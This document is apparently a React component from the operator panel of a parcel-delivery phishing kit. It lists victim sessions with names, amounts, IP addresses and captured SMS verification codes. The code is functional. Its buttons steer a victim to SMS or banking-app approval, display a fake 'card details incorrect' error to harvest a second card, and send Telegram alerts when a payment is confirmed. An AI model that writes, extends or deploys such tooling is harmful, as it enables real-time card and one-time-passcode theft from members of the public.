import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { 
  CreditCard, 
  MessageSquare, 
  Package,
  Clock,
  CheckCircle,
  Smartphone,
  MessageCircle,
  Globe,
  Copy,
  Check,
  MoreHorizontal,
  XCircle,
  AlertTriangle,
  Info
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_ip: string | null;
  origin: string | null;
  destination: string | null;
  estimated_delivery: string | null;
  created_at: string;
  updated_at: string;
}

const stepNames: Record<number, string> = {
  1: "Parcel",
  2: "Payment",
  3: "Verify",
  4: "Done"
};

const stepColors: Record<number, string> = {
  1: "bg-blue-500",
  2: "bg-yellow-500",
  3: "bg-purple-500",
  4: "bg-green-500"
};

interface ClientRowProps {
  session: ClientSession;
  isSelected?: boolean;
  onToggleSelect?: () => void;
  onOpenDetails?: () => void;
}

export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenDetails }: ClientRowProps) {
  const [ipCopied, setIpCopied] = useState(false);

  const copyIpToClipboard = async () => {
    if (!session.client_ip) return;
    await navigator.clipboard.writeText(session.client_ip);
    setIpCopied(true);
    setTimeout(() => setIpCopied(false), 2000);
  };

  const getTimeSince = (dateString: string) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) return "now";
    if (diffMins < 60) return `${diffMins}m`;
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `${diffHours}h`;
    return `${Math.floor(diffHours / 24)}d`;
  };

  const getShortIp = (ip: string | null) => {
    if (!ip) return null;
    const parts = ip.split('.');
    if (parts.length === 4) {
      return `${parts[0]}.${parts[1]}.*.*`;
    }
    return ip.slice(0, 10) + '...';
  };

  // Quick actions
  const sendToSmsVerification = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: null, verification_code: null })
      .eq("id", session.id);
    toast({ title: "Sent to SMS" });
  };

  const sendToAppApproval = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
      .eq("id", session.id);
    toast({ title: "Sent to App" });
  };

  const sendWrongCardMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 2,
        approval_type: null,
        admin_message: "The card details you entered are incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Wrong card sent" });
  };

  const sendBackToParcel = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 1,
        approval_type: null,
        admin_message: null,
        message_type: null
      })
      .eq("id", session.id);
    toast({ title: "Back to parcel" });
  };

  const confirmPayment = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "sms" })
      .eq("id", session.id);
    await supabase.functions.invoke("send-telegram", {
      body: { message: `✅ Confirmed (SMS) - #${session.session_code}` },
    });
    toast({ title: "Confirmed" });
  };

  const approvePayment = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "app" })
      .eq("id", session.id);
    await supabase.functions.invoke("send-telegram", {
      body: { message: `✅ Approved (App) - #${session.session_code}` },
    });
    toast({ title: "Approved" });
  };

  const clearMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", session.id);
    toast({ title: "Cleared" });
  };

  const isWaiting = session.current_step === 2 && session.approval_type === "payment_waiting";
  const isVerifying = session.current_step === 3;
  const isAppMode = session.approval_type === "app_pending";

  return (
    <div className={`flex items-center gap-2 p-2 border-b hover:bg-muted/50 transition-colors ${isSelected ? 'bg-primary/5' : ''} ${isWaiting ? 'bg-orange-500/5' : ''}`}>
      {/* Checkbox */}
      <Checkbox
        checked={isSelected}
        onCheckedChange={onToggleSelect}
        className="shrink-0"
      />

      {/* Session Code */}
      <span className="font-mono bg-muted px-1.5 py-0.5 rounded text-xs font-bold w-16 text-center shrink-0">
        #{session.session_code}
      </span>

      {/* Step Badge */}
      <Badge className={`${stepColors[session.current_step]} text-white text-xs w-14 justify-center shrink-0`}>
        {isWaiting ? "Wait" : stepNames[session.current_step]}
      </Badge>

      {/* Client Name */}
      <span className="text-sm truncate w-24 shrink-0" title={session.client_name || undefined}>
        {session.client_name || "-"}
      </span>

      {/* Amount */}
      <span className="text-sm font-semibold text-primary w-16 shrink-0 text-right">
        {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
      </span>

      {/* IP */}
      {session.client_ip && (
        <TooltipProvider>
          <Tooltip>
            <TooltipTrigger asChild>
              <Badge 
                variant="outline" 
                className="text-xs gap-1 shrink-0 cursor-pointer hover:bg-muted w-20 justify-center"
                onClick={copyIpToClipboard}
              >
                {ipCopied ? <Check className="w-3 h-3 text-green-500" /> : <Globe className="w-3 h-3" />}
                {getShortIp(session.client_ip)}
              </Badge>
            </TooltipTrigger>
            <TooltipContent>
              <span className="font-mono text-sm">{session.client_ip}</span>
              {ipCopied ? " ✓" : " (click to copy)"}
            </TooltipContent>
          </Tooltip>
        </TooltipProvider>
      )}

      {/* Time */}
      <span className="text-xs text-muted-foreground w-8 shrink-0 flex items-center gap-1">
        <Clock className="w-3 h-3" />
        {getTimeSince(session.updated_at)}
      </span>

      {/* Message indicator */}
      {session.admin_message && (
        <TooltipProvider>
          <Tooltip>
            <TooltipTrigger asChild>
              <span className="shrink-0">
                {session.message_type === "error" && <XCircle className="w-4 h-4 text-red-500" />}
                {session.message_type === "warning" && <AlertTriangle className="w-4 h-4 text-yellow-500" />}
                {session.message_type === "info" && <Info className="w-4 h-4 text-blue-500" />}
              </span>
            </TooltipTrigger>
            <TooltipContent>
              <p className="max-w-[200px] text-sm">{session.admin_message}</p>
            </TooltipContent>
          </Tooltip>
        </TooltipProvider>
      )}

      {/* Verification Code (if applicable) */}
      {isVerifying && !isAppMode && session.verification_code && (
        <span className="font-mono text-xs bg-purple-100 text-purple-700 px-1.5 py-0.5 rounded shrink-0">
          {session.verification_code}
        </span>
      )}

      {/* Spacer */}
      <div className="flex-1" />

      {/* Quick Actions based on state */}
      {isWaiting && (
        <div className="flex items-center gap-1 shrink-0">
          <Button size="sm" className="h-7 text-xs bg-green-600 hover:bg-green-700 px-2" onClick={sendToSmsVerification}>
            <MessageCircle className="w-3 h-3 mr-1" /> SMS
          </Button>
          <Button size="sm" className="h-7 text-xs bg-blue-600 hover:bg-blue-700 px-2" onClick={sendToAppApproval}>
            <Smartphone className="w-3 h-3 mr-1" /> App
          </Button>
        </div>
      )}

      {isVerifying && !isAppMode && (
        <Button size="sm" className="h-7 text-xs bg-green-600 hover:bg-green-700 px-2 shrink-0" onClick={confirmPayment}>
          <CheckCircle className="w-3 h-3 mr-1" /> Confirm
        </Button>
      )}

      {isVerifying && isAppMode && (
        <Button size="sm" className="h-7 text-xs bg-blue-600 hover:bg-blue-700 px-2 shrink-0" onClick={approvePayment}>
          <CheckCircle className="w-3 h-3 mr-1" /> Approve
        </Button>
      )}

      {/* More Actions Dropdown */}
      <DropdownMenu>
        <DropdownMenuTrigger asChild>
          <Button variant="ghost" size="sm" className="h-7 w-7 p-0 shrink-0">
            <MoreHorizontal className="w-4 h-4" />
          </Button>
        </DropdownMenuTrigger>
        <DropdownMenuContent align="end" className="w-40">
          <DropdownMenuItem onClick={sendBackToParcel}>
            <Package className="w-4 h-4 mr-2" /> Back to Parcel
          </DropdownMenuItem>
          <DropdownMenuItem onClick={() => supabase.from("client_sessions").update({ current_step: 2, approval_type: null }).eq("id", session.id).then(() => toast({ title: "Back to Payment" }))}>
            <CreditCard className="w-4 h-4 mr-2" /> Back to Payment
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem onClick={sendToSmsVerification}>
            <MessageSquare className="w-4 h-4 mr-2" /> Send to SMS
          </DropdownMenuItem>
          <DropdownMenuItem onClick={sendToAppApproval}>
            <Smartphone className="w-4 h-4 mr-2" /> Send to App
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem onClick={sendWrongCardMessage} className="text-orange-600">
            <CreditCard className="w-4 h-4 mr-2" /> Wrong Card
          </DropdownMenuItem>
          {session.admin_message && (
            <DropdownMenuItem onClick={clearMessage}>
              <XCircle className="w-4 h-4 mr-2" /> Clear Message
            </DropdownMenuItem>
          )}
          <DropdownMenuSeparator />
          <DropdownMenuItem onClick={confirmPayment} className="text-green-600">
            <CheckCircle className="w-4 h-4 mr-2" /> Confirm (SMS)
          </DropdownMenuItem>
          <DropdownMenuItem onClick={approvePayment} className="text-blue-600">
            <CheckCircle className="w-4 h-4 mr-2" /> Approve (App)
          </DropdownMenuItem>
        </DropdownMenuContent>
      </DropdownMenu>
    </div>
  );
}
